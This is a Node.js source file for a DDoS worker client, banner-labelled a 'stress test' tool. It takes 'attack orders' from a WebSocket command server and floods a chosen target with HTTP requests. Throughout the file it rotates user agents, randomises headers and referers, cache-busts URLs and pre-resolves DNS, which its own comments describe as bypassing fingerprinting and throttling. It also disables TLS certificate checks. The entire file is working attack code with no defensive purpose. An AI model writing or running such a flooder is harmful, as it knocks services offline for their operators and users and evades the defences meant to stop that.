const WebSocket = require('ws');
const https = require('https');
const http = require('http');
const dns = require('dns').promises;

const SERVER_URL = 'ws://localhost:8080'; // Change this to your server address

// DNS Cache to bypass DNS throttling
const dnsCache = new Map();

// HTTP agents for connection pooling
const httpAgent = new http.Agent({
  keepAlive: true,
  maxSockets: 500,
  maxFreeSockets: 100
});

const httpsAgent = new https.Agent({
  keepAlive: true,
  maxSockets: 500,
  maxFreeSockets: 100,
  rejectUnauthorized: false // Allow self-signed certs
});

// User agents rotation to bypass fingerprinting
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
];

let ws;
let isRunning = false;
let stats = { sent: 0, success: 0, failed: 0 };
let currentConfig = null;
let attackStartTime = null;

function connect() {
  console.log('[*] Connecting to command server...');
  ws = new WebSocket(SERVER_URL);
  
  ws.on('open', () => {
    log('✓ Connected to command server');
    ws.send(JSON.stringify({ type: 'identify', role: 'worker' }));
  });

  ws.on('message', async (data) => {
    const message = JSON.parse(data);
    
    if (message.type === 'ready') {
      log('✓ Worker ready - awaiting orders');
    }
    
    if (message.type === 'start') {
      log('⚡ Attack orders received!');
      currentConfig = message.config;
      startAttack(currentConfig);
    }
    
    if (message.type === 'stop') {
      log('⏹ Stop command received');
      stopAttack();
    }
  });

  ws.on('close', () => {
    log('✗ Disconnected from server');
    stopAttack();
    setTimeout(connect, 2000);
  });

  ws.on('error', (err) => {
    console.error('WebSocket error:', err.message);
  });
}

async function startAttack(config) {
  isRunning = true;
  stats = { sent: 0, success: 0, failed: 0 };
  attackStartTime = Date.now();
  
  log(`🎯 Target: ${config.target}`);
  log(`📊 Duration: ${config.duration}s | Threads: ${config.threads} | Delay: ${config.delay}ms | Method: ${config.method}`);
  log('🚀 ATTACK STARTED - THREAD MODE');
  
  const endTime = attackStartTime + (config.duration * 1000);
  
  // Create attack threads
  const threads = [];
  for (let i = 0; i < config.threads; i++) {
    threads.push(attackThread(config, endTime));
  }
  
  // Stats reporter interval
  const statsInterval = setInterval(() => {
    if (isRunning) {
      reportStats();
      updateDisplay();
    }
  }, 1000);
  
  // Wait for all threads to complete
  await Promise.all(threads);
  
  clearInterval(statsInterval);
  
  const duration = ((Date.now() - attackStartTime) / 1000).toFixed(2);
  const rps = (stats.sent / duration).toFixed(2);
  
  // Send final stats
  reportStats();
  
  if (isRunning) {
    log(`\n✓ Attack completed in ${duration}s`);
    log(`📈 Final Stats - Sent: ${stats.sent} | Success: ${stats.success} | Failed: ${stats.failed}`);
    log(`⚡ Average Speed: ${rps} requests/second`);
    isRunning = false;
    attackStartTime = null;
  }
}

async function attackThread(config, endTime) {
  // Pre-resolve DNS to bypass DNS throttling
  let resolvedIP = null;
  if (config.bypassDNS) {
    try {
      const url = new URL(config.target);
      resolvedIP = await resolveDNS(url.hostname);
    } catch (e) {
      log('⚠ DNS resolution failed, using hostname');
    }
  }
  
  // Don't wait for responses - fire and forget for max speed
  while (isRunning && Date.now() < endTime) {
    sendRequestNoWait(config, resolvedIP);
    stats.sent++;
    
    if (config.delay > 0) {
      await sleep(config.delay);
    }
  }
}

async function resolveDNS(hostname) {
  // Check cache first
  if (dnsCache.has(hostname)) {
    return dnsCache.get(hostname);
  }
  
  try {
    const addresses = await dns.resolve4(hostname);
    const ip = addresses[0];
    dnsCache.set(hostname, ip);
    log(`✓ DNS resolved: ${hostname} -> ${ip}`);
    return ip;
  } catch (error) {
    return null;
  }
}

function getRandomUserAgent() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function getRandomHeaders(config) {
  const headers = {
    'User-Agent': getRandomUserAgent(),
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
  };
  
  // Random headers to bypass fingerprinting
  if (config.randomHeaders) {
    const extraHeaders = {
      'DNT': '1',
      'Cache-Control': 'max-age=0',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1'
    };
    
    // Randomly add some extra headers
    Object.keys(extraHeaders).forEach(key => {
      if (Math.random() > 0.5) {
        headers[key] = extraHeaders[key];
      }
    });
  }
  
  // Add custom referer if enabled
  if (config.randomReferer) {
    const referers = [
      'https://www.google.com/',
      'https://www.facebook.com/',
      'https://www.twitter.com/',
      'https://www.reddit.com/',
      'https://www.youtube.com/'
    ];
    headers['Referer'] = referers[Math.floor(Math.random() * referers.length)];
  }
  
  return headers;
}

function sendRequestNoWait(config, resolvedIP) {
  // Fire request without waiting for response
  try {
    const url = new URL(config.target);
    const protocol = url.protocol === 'https:' ? https : http;
    const agent = url.protocol === 'https:' ? httpsAgent : httpAgent;
    
    const options = {
      hostname: resolvedIP || url.hostname, // Use resolved IP if available
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: url.pathname + url.search + (config.cacheBust ? `?_=${Date.now()}${Math.random()}` : ''),
      method: config.method,
      headers: getRandomHeaders(config),
      timeout: 5000,
      agent: agent
    };
    
    // Add Host header when using IP
    if (resolvedIP) {
      options.headers['Host'] = url.hostname;
    }
    
    const req = protocol.request(options, (res) => {
      stats.success++;
      res.resume(); // Drain response without reading
    });
    
    req.on('error', () => {
      stats.failed++;
    });
    
    req.on('timeout', () => {
      stats.failed++;
      req.destroy();
    });
    
    // Add POST body if needed
    if (config.method === 'POST' && config.postData) {
      req.write(config.postData);
    }
    
    req.end();
    
  } catch (error) {
    stats.failed++;
  }
}

async function sendRequest(config) {
  stats.sent++;
  
  return new Promise((resolve) => {
    try {
      const url = new URL(config.target);
      const protocol = url.protocol === 'https:' ? https : http;
      
      const options = {
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname + url.search,
        method: config.method,
        headers: {
          'User-Agent': 'StressTest-Worker/1.0',
          'Accept': '*/*'
        },
        timeout: 10000
      };
      
      const req = protocol.request(options, (res) => {
        stats.success++;
        res.on('data', () => {}); // Consume response
        res.on('end', () => resolve());
      });
      
      req.on('error', () => {
        stats.failed++;
        resolve();
      });
      
      req.on('timeout', () => {
        stats.failed++;
        req.destroy();
        resolve();
      });
      
      req.end();
      
    } catch (error) {
      stats.failed++;
      resolve();
    }
  });
}

function stopAttack() {
  if (isRunning) {
    isRunning = false;
    log('⏹ Attack stopped');
  }
}

function reportStats() {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({
      type: 'stats',
      stats: stats
    }));
  }
}

function updateDisplay() {
  if (!attackStartTime) return;
  
  const elapsed = (Date.now() - attackStartTime) / 1000;
  const successRate = stats.sent > 0 ? ((stats.success / stats.sent) * 100).toFixed(1) : 0;
  const rps = elapsed > 0 ? (stats.sent / elapsed).toFixed(0) : 0;
  
  process.stdout.write(`\r[📊] Sent: ${stats.sent} | Success: ${stats.success} | Failed: ${stats.failed} | Rate: ${successRate}% | RPS: ${rps}     `);
}

function log(message) {
  const time = new Date().toLocaleTimeString();
  console.log(`\n[${time}] ${message}`);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ASCII Banner
console.log(`
╔════════════════════════════════════════╗
║     STRESS TEST WORKER CLIENT          ║
║         Node.js Edition                ║
╠════════════════════════════════════════╣
║  Connecting to: ${SERVER_URL.padEnd(23)}║
╚════════════════════════════════════════╝
`);

// Start connection
connect();

// Handle graceful shutdown
process.on('SIGINT', () => {
  console.log('\n\n[!] Shutting down worker...');
  stopAttack();
  if (ws) ws.close();
  process.exit(0);
});